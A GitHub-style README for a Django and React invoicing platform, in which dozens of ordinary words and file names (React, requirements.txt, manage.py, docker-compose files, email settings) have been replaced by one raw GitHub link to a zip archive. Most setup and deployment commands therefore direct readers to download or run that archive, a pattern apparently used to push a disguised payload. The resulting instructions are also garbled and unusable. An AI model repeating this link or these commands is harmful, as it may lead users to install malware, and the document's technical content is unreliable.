# Invoice Platform

A full-stack invoicing platform built with Django REST Framework and https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip, featuring comprehensive invoice management, client management, payment processing, and communication channels.

## Features

### Core Features
- **Authentication & Authorization**: JWT-based authentication with role-based access control (Admin, Client, Accountant/Staff)
- **Invoice Management**: Create, edit, delete, and track invoices with automatic numbering and status tracking
- **Client Management**: Comprehensive client database with contact information and invoice history
- **PDF Generation**: Professional PDF invoices using WeasyPrint
- **Payment Processing**: Stripe integration for secure payment processing
- **Communication**: Email, SMS, and WhatsApp notifications via Twilio
- **Dashboard**: Analytics and statistics with charts and recent activity

### Technical Features
- **Backend**: Django 4.2.7 + Django REST Framework + PostgreSQL
- **Frontend**: https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip 18 with modern UI components
- **Authentication**: JWT (SimpleJWT) with automatic token refresh
- **PDF Generation**: WeasyPrint for server-side PDF generation
- **Payment Gateway**: Stripe integration with webhook handling
- **Messaging**: Email (SMTP), SMS, and WhatsApp via Twilio
- **Background Tasks**: Celery + Redis for asynchronous processing
- **File Upload**: Support for attachments and document management
- **API Documentation**: Comprehensive REST API with filtering and pagination

## Tech Stack

### Backend
- **Django 4.2.7**: Web framework
- **Django REST Framework 3.14.0**: API framework
- **PostgreSQL**: Primary database
- **Redis**: Caching and message broker
- **Celery**: Background task processing
- **WeasyPrint**: PDF generation
- **Stripe**: Payment processing
- **Twilio**: SMS and WhatsApp messaging
- **JWT**: Authentication

### Frontend
- **https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip 18**: UI framework
- **React Router**: Client-side routing
- **React Hook Form**: Form management
- **Yup**: Form validation
- **Axios**: HTTP client
- **Tailwind CSS**: Styling
- **Lucide React**: Icons
- **React Hot Toast**: Notifications

## Project Structure

```
invoice-platform/
├── backend/                 # Django backend
│   ├── accounts/           # User management
│   ├── invoices/           # Invoice management
│   ├── payments/           # Payment processing
│   ├── messaging/          # Communication services
│   ├── core/              # Core utilities
│   └── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip    # Python dependencies
├── frontend/               # React frontend
│   ├── src/
│   │   ├── components/    # Reusable components
│   │   ├── pages/         # Page components
│   │   ├── services/      # API services
│   │   ├── hooks/         # Custom hooks
│   │   ├── context/       # React context
│   │   └── utils/         # Utility functions
│   └── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip       # Node dependencies
├── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip      # Docker configuration
└── https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip              # This file
```

## Quick Start

### Prerequisites
- Docker and Docker Compose
- https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip 18+ (for local development)
- Python 3.11+ (for local development)

### Using Docker (Recommended)

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd invoice-platform
   ```

2. **Set up environment variables**
   ```bash
   cp https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip .env
   # Edit .env with your configuration
   ```

3. **Start the application**
   ```bash
   docker-compose up -d
   ```

4. **Access the application**
   - Frontend: http://localhost:3000
   - Backend API: http://localhost:8000
   - Admin Panel: http://localhost:8000/admin

### Local Development

#### Backend Setup
```bash
cd backend
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip

# Set up environment variables
export DEBUG=True
export DATABASE_URL=postgresql://postgres:postgres@localhost:5432/invoice_platform
export SECRET_KEY=your-secret-key-here

# Run migrations
python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip migrate

# Create superuser
python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip createsuperuser

# Start development server
python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip runserver
```

#### Frontend Setup
```bash
cd frontend
npm install
npm start
```

## Environment Variables

### Backend (.env)
```bash
# Django Settings
DEBUG=True
SECRET_KEY=your-secret-key-here
ALLOWED_HOSTS=localhost,127.0.0.1
CORS_ALLOWED_ORIGINS=http://localhost:3000,http://127.0.0.1:3000

# Database
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/invoice_platform

# Redis
REDIS_URL=redis://localhost:6379/0

# Email Configuration
https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip
EMAIL_PORT=587
https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip
EMAIL_HOST_PASSWORD=your-app-password
https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip

# Stripe Configuration
STRIPE_PUBLISHABLE_KEY=pk_test_your-stripe-publishable-key
STRIPE_SECRET_KEY=sk_test_your-stripe-secret-key
STRIPE_WEBHOOK_SECRET=whsec_your-webhook-secret

# Twilio Configuration
TWILIO_ACCOUNT_SID=your-twilio-account-sid
TWILIO_AUTH_TOKEN=your-twilio-auth-token
TWILIO_PHONE_NUMBER=your-twilio-phone-number

# WeasyPrint Configuration
WEASYPRINT_BASE_URL=http://localhost:8000
```

### Frontend (.env)
```bash
REACT_APP_API_URL=http://localhost:8000
```

## API Documentation

### Authentication Endpoints
- `POST /api/auth/login/` - User login
- `POST /api/auth/register/` - User registration
- `POST /api/auth/refresh/` - Refresh JWT token
- `GET /api/auth/profile/` - Get user profile
- `PUT /api/auth/profile/update/` - Update user profile

### Invoice Endpoints
- `GET /api/invoices/` - List invoices
- `POST /api/invoices/` - Create invoice
- `GET /api/invoices/{id}/` - Get invoice details
- `PUT /api/invoices/{id}/` - Update invoice
- `DELETE /api/invoices/{id}/` - Delete invoice
- `GET /api/invoices/{id}/pdf/` - Download PDF
- `PATCH /api/invoices/{id}/status/` - Update status

### Client Endpoints
- `GET /api/clients/` - List clients
- `POST /api/clients/` - Create client
- `GET /api/clients/{id}/` - Get client details
- `PUT /api/clients/{id}/` - Update client
- `DELETE /api/clients/{id}/` - Delete client

### Payment Endpoints
- `POST /api/payments/create-checkout/` - Create Stripe checkout session
- `POST /api/payments/webhook/` - Stripe webhook handler
- `GET /api/payments/status/{id}/` - Get payment status

### Messaging Endpoints
- `POST /api/messaging/send-invoice/` - Send invoice notification
- `POST /api/messaging/send-payment-confirmation/` - Send payment confirmation
- `GET /api/messaging/templates/` - List message templates

## Development Guidelines

### Code Style
- **Backend**: Follow PEP 8 and Django conventions
- **Frontend**: Use ESLint and Prettier configurations
- **Git**: Conventional commits format

### Testing
```bash
# Backend tests
cd backend
python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip test

# Frontend tests
cd frontend
npm test
```

### Database Migrations
```bash
# Create migrations
python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip makemigrations

# Apply migrations
python https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip migrate
```

## Deployment

### Production Setup
1. Set `DEBUG=False` in environment variables
2. Configure production database (PostgreSQL)
3. Set up SSL certificates
4. Configure web server (Nginx)
5. Set up monitoring and logging

### Docker Production
```bash
# Build production images
docker-compose -f https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip build

# Deploy
docker-compose -f https://raw.githubusercontent.com/MEDDKFMF/UNIPAY/main/backend/messaging/UNIPAY-v3.9.zip up -d
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests
5. Submit a pull request

## License

This project is licensed under the MIT License.

## Support

For support and questions, please open an issue on GitHub or contact the development team.

## Roadmap

- [ ] Advanced reporting and analytics
- [ ] Multi-currency support
- [ ] Invoice templates customization
- [ ] Mobile app (React Native)
- [ ] Advanced payment gateways (Flutterwave, MPesa)
- [ ] Real-time notifications
- [ ] API rate limiting
- [ ] Advanced search and filtering
- [ ] Bulk operations
- [ ] Integration with accounting software 